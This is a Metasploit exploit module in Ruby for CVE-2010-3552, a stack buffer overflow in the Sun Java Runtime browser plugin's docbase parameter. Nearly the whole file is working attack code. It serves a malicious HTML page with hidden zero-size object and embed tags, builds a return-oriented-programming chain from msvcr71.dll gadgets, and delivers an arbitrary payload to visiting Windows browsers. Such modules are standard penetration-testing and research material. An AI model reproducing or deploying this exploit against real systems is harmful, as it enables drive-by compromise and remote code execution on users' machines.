##
# $Id: java_docbase_bof.rb 11513 2011-01-08 00:25:44Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sun Java Runtime New Plugin docbase Buffer Overflow',
			'Description'    => %q{
					This module exploits a flaw in the new plugin component of the Sun Java
				Runtime Environment before v6 Update 22. By specifying specific parameters
				to the new plugin, an attacker can cause a stack-based buffer overflow and
				execute arbitrary code.

				When the new plugin is invoked with a "launchjnlp" parameter, it will
				copy the contents of the "docbase" parameter to a stack-buffer using the
				"sprintf" function. A string of 396 bytes is enough to overflow the 256
				byte stack buffer and overwrite some local variables as well as the saved
				return address.

				NOTE: The string being copied is first passed through the "WideCharToMultiByte".
				Due to this, only characters which have a valid localized multibyte
				representation are allowed. Invalid characters will be replaced with
				question marks ('?').

				This vulnerability was originally discovered independently by both Stephen
				Fewer and Berend Jan Wever (SkyLined). Although exhaustive testing hasn't
				been done, all versions since version 6 Update 10 are believed to be affected
				by this vulnerability.

				This vulnerability was patched as part of the October 2010 Oracle Patch
				release.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'jduck',
			'Version'        => '$Revision: 11513 $',
			'References'     =>
				[
					[ 'CVE', '2010-3552' ],
					[ 'OSVDB', '68873' ],
					[ 'BID', '44023' ],
					[ 'URL', 'http://blog.harmonysecurity.com/2010/10/oracle-java-ie-browser-plugin-stack.html' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-206/' ],
					[ 'URL', 'http://code.google.com/p/skylined/issues/detail?id=23' ],
					[ 'URL', 'http://skypher.com/index.php/2010/10/13/issue-2-oracle-java-object-launchjnlp-docbase/' ],
					[ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpuoct2010-176258.html' ],
				],
			'Platform'       => 'win',
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					# The double quote is due to the html, the rest due to utf8 conversion crap.
					'BadChars' => "\x00\x22" + (0x80..0x9f).to_a.pack('C*'),
					'DisableNops' => true,
					#'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'EAX',
						}
				},
			'Targets'        =>
				[
					# Tested OK on:
					# JRE 6u21 on XPSP3 and Win7-RTM
					# JRE 6u18 on XPSP3 (ugly dialog on IE8)
					# JRE 6u11 on XPSP3 (ugly dialog on IE8)
					[ 'Windows Universal (msvcr71.dll ROP)', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 12 2010'
			))
	end

	def on_request_uri(cli, request)

		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending exploit HTML to #{cli.peerhost}:#{cli.peerport}")

		# ActiveX params
		clsid = 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA'
		var_obj = rand_text_alpha(8+rand(8))


		# These addresses are from the bundled msvcr71.dll from JRE 6u21
=begin
7c340000 7c396000   MSVCR71    (export symbols)       C:\Program Files\Java\jre6\bin\MSVCR71.dll
Loaded symbol image file: C:\Program Files\Java\jre6\bin\MSVCR71.dll
Image path: C:\Program Files\Java\jre6\bin\MSVCR71.dll
Image name: MSVCR71.dll
Timestamp:        Fri Feb 21 07:42:20 2003 (3E561EAC)
CheckSum:         0005F1E9
ImageSize:        00056000
File version:     7.10.3052.4
Product version:  7.10.3052.4
=end

		base = 0x7c340000
		rva = {
			'scratch'     => 0x4b170, # Scratch space..
			'scratch2'    => 0x4b170 - 0x10, # Scratch space..
			'import_VA'   => 0x3a08c - 0x58, # The import address of HeapCreate (less 0x58, avoid badchars)
			'add_58_eax'  => 0xd05e,  # add eax, 0x58 / ret
			'pop_eax'     => 0x4cc1,  # pop eax / ret
			'deref_eax'   => 0x130ea, # mov eax, [eax] / ret
			'deref_eax4'  => 0xe72b,  # mov eax, [eax+4] / ret
			'jmp_eax'     => 0x13ac,  # push eax / ret
			'jmp_ecx'     => 0x6b0e,  # jmp ecx
			'pop_edx'     => 0x5937,  # pop edx / ret
			'adjust_eax'  => 0x32ef8, # add eax, 0x80bf / add dh, dh / ret
			'rep_movsd'   => 0x363f,  # rep movsd / pop edi / pop esi / sub eax, eax / ret
			'esp_to_esi'  => 0x32f4f, # push esp / and al, 0x10 / mov [edx], ecx / pop esi / ret
			'switcheroo'  => 0x3427,  # mov ecx, eax / mov eax, esi / pop esi / ret 0x10
			'st_eax_ecx'  => 0x103c8, # mov [ecx], eax / ret
			'xor_ecx'     => 0x1aa5f, # xor ecx, ecx / mov [eax+0xc], ecx / ret 4
			'set_ecx_fd'  => 0x1690b, # mov cl, 0xfe / dec ecx / ret
		}

		extra_insn = 'nop'
		#extra_insn = 'int 3'
		single_op = Metasm::Shellcode.assemble(Metasm::Ia32.new, <<-EOS).encode_string
	#{extra_insn}
	push ecx
	pop edi
	ret
EOS

		# This is the ROP stack.
		stack = [
			# Load HeapCreate addr from IAT
			'pop_eax',
			0x41414141,     # unused space..
			0x41414141,
			0x41414141,
			0x41414141,
			'import_VA',    # becomes eax
			'add_58_eax',
			'deref_eax',

			# call HeapCreate
			'jmp_eax',
			'adjust_eax',   # eip after HeapCreate
			0x01040110,     # flOptions (gets & with 0x40005)
			0x01010101,     # dwInitialSize
			0x01010101,     # dwMaximumSize

			# Move esp into esi
			'pop_edx',
			'scratch',      # becomes edx
			'esp_to_esi',

			# Store a single-dword stub to our buffer
			'switcheroo',
			single_op.unpack('V').first,  # becomes esi/eax
			'deref_eax4',
			0x41414141,     # more unused space..
			0x41414141,
			0x41414141,
			0x41414141,
			'st_eax_ecx',
			
			# Call our dword-stub
			'jmp_ecx',

			# Re-load ESP and save our Heap address to scratch (edx)
			'esp_to_esi',

			# Set ecx to something sane (for memcpy)
			'pop_eax',
			'scratch2',
			'xor_ecx',
			'set_ecx_fd',
			0x41414141,     # skipped by ret 0x4

			# Do the memcpy!
			'rep_movsd',
			0x41414141,     # becomes edi
			0x41414141,     # becomes esi

			# Re-load our Heap pointer
			'pop_eax',
			'scratch',
			'deref_eax',

			# Adjust it to skip the non-payload parts
			'add_58_eax',
			
			# Execute it !
			'jmp_eax',

			# BOOO!
			0x41414141
		]

		# Replace unused entries with randomness
		stack = stack.map { |el|
			if el.kind_of? String
				base + rva[el]
			elsif el == 0x41414141
				rand_text(4).unpack('V').first
			else
				el
			end
		}.pack('V*')


		# Create the overflow buffer
		docbase = rand_text(392)
		docbase << stack
		docbase << rand_text(584 - docbase.length)
		docbase << payload.encoded

		# Generate the html page that will trigger the vuln.
		html = <<-EOS
<html>
<body>Please wait...
<object id="#{var_obj}" classid="clsid:#{clsid}" width="0" height="0">
<PARAM name="launchjnlp" value="1">
<PARAM name="docbase" value="#{docbase}">
</object>
<embed type="application/x-java-applet" width="0" height="0" launchjnlp="1" docbase="#{docbase}" />
</body>
</html>
EOS

		# Pow.
		send_response_html(cli, html,
			{
				'Content-Type' => 'text/html',
				'Pragma' => 'no-cache'
			})
	end

end
